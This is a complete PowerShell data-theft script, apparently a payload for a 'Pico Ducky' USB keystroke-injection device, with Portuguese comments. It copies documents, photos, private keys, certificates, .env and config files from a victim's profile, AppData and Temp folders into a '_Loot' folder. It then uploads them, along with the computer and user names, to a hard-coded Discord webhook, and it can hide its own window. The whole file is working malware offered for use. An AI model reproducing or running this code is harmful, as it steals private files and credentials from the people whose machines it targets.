<#
.SYNOPSIS
    Coleta arquivos de um computador e envia para um webhook do Discord.
.DESCRIPTION
    Aguarda a conexao de um USB, coleta arquivos de pastas do usuario atual
    (incluindo Temp, AppData\Local, AppData\Roaming), limita a 10 arquivos
    por lote e 8MB por arquivo, e envia para o Discord.
.NOTES
    Autor: Adaptado para Pico Ducky
    Limites: 10 arquivos/lote, 8MB/arquivo
#>

# ============= CONFIGURACAO =============
$webhookUrl = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
$maxFilesPerBatch = 10
$maxFileSizeMB = 8
$maxFileSizeBytes = $maxFileSizeMB * 1MB

# ============= FUNCOES =============
function Send-DiscordMessage {
    param(
        [string]$Message,
        [string]$WebhookUrl
    )
    
    try {
        $body = @{ content = $Message } | ConvertTo-Json
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
        return $true
    }
    catch {
        Write-Host "Erro ao enviar mensagem para o Discord: $_" -ForegroundColor Red
        return $false
    }
}

function Send-FilesToDiscord {
    param(
        [string]$FolderPath,
        [string]$WebhookUrl,
        [int]$MaxFiles = 10,
        [int]$MaxSizeBytes = 8MB
    )
    
    $files = Get-ChildItem -Path $FolderPath -File | Where-Object { $_.Length -le $MaxSizeBytes }
    
    if ($files.Count -eq 0) {
        Write-Host "Nenhum arquivo valido para enviar (tamanho <= 8MB)." -ForegroundColor Yellow
        return @{sent = 0; skipped = 0}
    }
    
    Write-Host "Encontrados $($files.Count) arquivos para envio." -ForegroundColor Cyan
    
    $sentCount = 0
    $skippedCount = 0
    $batchNumber = 1
    $fileIndex = 0
    
    while ($fileIndex -lt $files.Count) {
        $batch = $files | Select-Object -Skip $fileIndex -First $MaxFiles
        $fileIndex += $MaxFiles
        
        Write-Host "Enviando lote $batchNumber ($($batch.Count) arquivos)..." -ForegroundColor Magenta
        
        $fileList = ($batch | ForEach-Object { "- $($_.Name) ($([math]::Round($_.Length / 1KB, 1)) KB)" }) -join "`n"
        $headerMessage = @{
            content = "[Lote $batchNumber] Pasta: $FolderPath`nArquivos:`n$fileList"
        } | ConvertTo-Json
        
        try {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $headerMessage -ContentType 'application/json'
            Start-Sleep -Milliseconds 300
        }
        catch {
            Write-Host "Erro ao enviar cabecalho do lote: $_" -ForegroundColor Red
        }
        
        foreach ($file in $batch) {
            try {
                if ($file.Length -gt $MaxSizeBytes) {
                    Write-Host "Arquivo muito grande: $($file.Name) - Pulando..." -ForegroundColor Yellow
                    $skippedCount++
                    continue
                }
                
                # Envia como texto se for pequeno e de extensao texto
                if ($file.Length -lt 2000 -and ($file.Extension -in '.txt','.log','.json','.cfg','.conf','.xml','.ini','.yaml','.config','.env','.csv','.forms')) {
                    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        if ($content.Length -gt 1900) {
                            $content = $content.Substring(0, 1900) + "... [truncado]"
                        }
                        $body = @{
                            content = "Arquivo: $($file.Name)`n```$content```"
                        } | ConvertTo-Json
                        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
                        Write-Host "Enviado (texto): $($file.Name)" -ForegroundColor Green
                        $sentCount++
                        Start-Sleep -Milliseconds 200
                        continue
                    }
                }
                
                # Envia como anexo
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
                $fileSizeKB = [math]::Round($file.Length / 1KB, 1)
                $contentText = "Anexo: $($file.Name) ($fileSizeKB KB)"
                
                $bodyLines = @(
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"payload_json`"$LF",
                    "{`"content`": `"$contentText`"}",
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
                    "Content-Type: application/octet-stream$LF",
                    $fileContent,
                    "--$boundary--$LF"
                ) -join $LF
                
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
                Write-Host "Enviado (anexo): $($file.Name)" -ForegroundColor Green
                $sentCount++
                Start-Sleep -Milliseconds 500
            }
            catch {
                Write-Host "Erro ao enviar $($file.Name): $_" -ForegroundColor Red
                $skippedCount++
            }
        }
        
        $batchNumber++
        if ($fileIndex -lt $files.Count) {
            Write-Host "Aguardando 2 segundos antes do proximo lote..." -ForegroundColor Gray
            Start-Sleep -Seconds 2
        }
    }
    
    return @{
        sent = $sentCount
        skipped = $skippedCount
        total = $files.Count
    }
}

# ============= OCULTACAO DA JANELA =============
function Hide-Window {
    Write-Host "Ocultando a janela..." -ForegroundColor Yellow
    Start-Sleep 1
    
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0)
            Write-Host "Janela ocultada com sucesso (via PID)." -ForegroundColor Green
        }
        else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
            Write-Host "Janela ocultada com sucesso (via titulo)." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Nao foi possivel ocultar a janela: $_" -ForegroundColor Red
    }
}

# ============= CORPO PRINCIPAL =============
Clear-Host

Write-Host "Enviando mensagem de inicio..." -ForegroundColor Cyan
$startMessage = "[Sistema Iniciado] Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss') Computador: $env:COMPUTERNAME Usuario: $env:USERNAME"
$webhookOk = Send-DiscordMessage -Message $startMessage -WebhookUrl $webhookUrl

if (-not $webhookOk) {
    Write-Host "Aviso: Nao foi possivel enviar mensagem de inicio. Verifique o webhook." -ForegroundColor Yellow
}

# --- Aguardar o USB ---
$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
$count = $removableDrives.count
$i = 30

Write-Host "Aguardando dispositivo USB... (30s timeout)" -ForegroundColor Yellow

if ($webhookOk) {
    $waitingMessage = "Aguardando USB... (30s)"
    Send-DiscordMessage -Message $waitingMessage -WebhookUrl $webhookUrl | Out-Null
}

while ($true) {
    Clear-Host
    Write-Host "Conecte um dispositivo USB.. ($i segundos restantes)" -ForegroundColor Yellow
    $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    Start-Sleep 1
    
    if ($count -ne $removableDrives.count) {
        Write-Host "USB conectado!" -ForegroundColor Green
        if ($webhookOk) {
            $usbMessage = "USB Conectado! Iniciando coleta..."
            Send-DiscordMessage -Message $usbMessage -WebhookUrl $webhookUrl | Out-Null
        }
        break
    }
    
    $i--
    if ($i -eq 0) {
        Write-Host "Tempo esgotado! Saindo..." -ForegroundColor Red
        if ($webhookOk) {
            $timeoutMessage = "Timeout! Nenhum USB conectado em 30s. Script encerrado."
            Send-DiscordMessage -Message $timeoutMessage -WebhookUrl $webhookUrl | Out-Null
        }
        Start-Sleep 2
        exit
    }
}

# --- Detectar o drive e criar pasta ---
$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
$driveLetter = $drive.DeviceID
Write-Host "Drive de destino: $driveLetter/" -ForegroundColor Green

$fileExtensions = @(
    "*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", 
    "*.jpg", "*.jpeg", "*.png", "*.cer", "*.key", "*.xls", 
    "*.xlsx", "*.cfg", "*.conf",
    "*.docx", "*.pptx", "*.ppt", "*.ppsx", "*.pptm", "*.potx",
    "*.env", "*.yaml", "*.config", "*.csv", "*.forms",
    "*.pem", "*.crt", "*.pkcs12", "*.pfx"
)

$foldersToSearch = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop", 
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\OneDrive",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Videos",
    "$env:USERPROFILE\AppData\Local",
    "$env:USERPROFILE\AppData\Roaming",
    "$env:USERPROFILE\AppData\Local\Temp",
    "$env:TEMP"
) | Where-Object { Test-Path $_ }

Write-Host "Pastas a serem pesquisadas:" -ForegroundColor Cyan
foreach ($folder in $foldersToSearch) {
    Write-Host "  - $folder" -ForegroundColor Gray
}

$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath -Force | Out-Null
    Write-Host "Pasta criada: $destinationPath" -ForegroundColor Green
}

# --- (Opcional) Ocultar a janela ---
# Hide-Window

# --- Coletar os arquivos ---
$driveIndex = 0
$collectedFiles = @()
$skippedLargeFiles = 0
$totalFilesFound = 0

Write-Host "Coletando arquivos (max. 8MB por arquivo)..." -ForegroundColor Cyan

foreach ($folder in $foldersToSearch) {
    if (-not (Test-Path $folder)) { continue }
    Write-Host "Procurando em: $folder" -ForegroundColor Gray
    
    foreach ($extension in $fileExtensions) {
        try {
            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $totalFilesFound++
                if ($file.Length -gt $maxFileSizeBytes) {
                    Write-Host "Arquivo ignorado (>8MB): $($file.Name) ($([math]::Round($file.Length / 1MB, 1)) MB)" -ForegroundColor Yellow
                    $skippedLargeFiles++
                    continue
                }
                
                $driveIndex++
                if ($driveIndex -gt 30) {
                    $drive = Get-Volume -DriveLetter $driveLetter.trimEnd(":")
                    if (-not $drive) {
                        Write-Host "USB desconectado! Encerrando..." -ForegroundColor Red
                        if ($webhookOk) {
                            $disconnectMessage = "USB Desconectado! Script interrompido."
                            Send-DiscordMessage -Message $disconnectMessage -WebhookUrl $webhookUrl | Out-Null
                        }
                        exit
                    }
                    $driveIndex = 0
                }
                
                $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
                if (Test-Path $destinationFile) {
                    $baseName = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
                    $extension2 = [System.IO.Path]::GetExtension($file.Name)
                    $counter = 1
                    do {
                        $newName = "$baseName`_$counter$extension2"
                        $destinationFile = Join-Path -Path $destinationPath -ChildPath $newName
                        $counter++
                    } while (Test-Path $destinationFile)
                }
                
                Copy-Item -Path $file.FullName -Destination $destinationFile -Force -ErrorAction SilentlyContinue
                $collectedFiles += $destinationFile
            }
        }
        catch {
            Write-Host "Erro ao acessar $folder : $_" -ForegroundColor Red
        }
    }
}

Write-Host "`nResumo da coleta:" -ForegroundColor Cyan
Write-Host "  Total de arquivos encontrados: $totalFilesFound" -ForegroundColor White
Write-Host "  Arquivos coletados (<=8MB): $($collectedFiles.Count)" -ForegroundColor Green
if ($skippedLargeFiles -gt 0) {
    Write-Host "  Arquivos ignorados (>8MB): $skippedLargeFiles" -ForegroundColor Yellow
}

# --- Enviar para o Discord ---
if ($collectedFiles.Count -gt 0) {
    Write-Host "`nEnviando para o Discord (max. $maxFilesPerBatch arquivos por lote)..." -ForegroundColor Cyan
    
    $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
    
    $summaryMessage = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados (>8MB): $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME Usuario: $env:USERNAME Finalizado: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
    
    Send-DiscordMessage -Message $summaryMessage -WebhookUrl $webhookUrl
    
    $endMessage = "[Sistema Finalizado] Todas as operacoes concluidas. Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss') Total de lotes: $([math]::Ceiling($collectedFiles.Count / $maxFilesPerBatch))"
    Send-DiscordMessage -Message $endMessage -WebhookUrl $webhookUrl
}
else {
    if ($webhookUrl -eq "SEU_WEBHOOK_URL_AQUI") {
        Write-Host "`nWebhook nao configurado! Arquivos salvos em: $destinationPath" -ForegroundColor Red
        $errorMessage = "[Erro] Webhook nao configurado. Arquivos salvos localmente em: $destinationPath"
        Send-DiscordMessage -Message $errorMessage -WebhookUrl $webhookUrl
    } else {
        Write-Host "`nNenhum arquivo coletado." -ForegroundColor Yellow
        $noFilesMessage = "[Nenhum Arquivo] Nenhum arquivo encontrado. Computador: $env:COMPUTERNAME Usuario: $env:USERNAME"
        Send-DiscordMessage -Message $noFilesMessage -WebhookUrl $webhookUrl
    }
}

Write-Host "`nScript finalizado!" -ForegroundColor Green
Start-Sleep 2
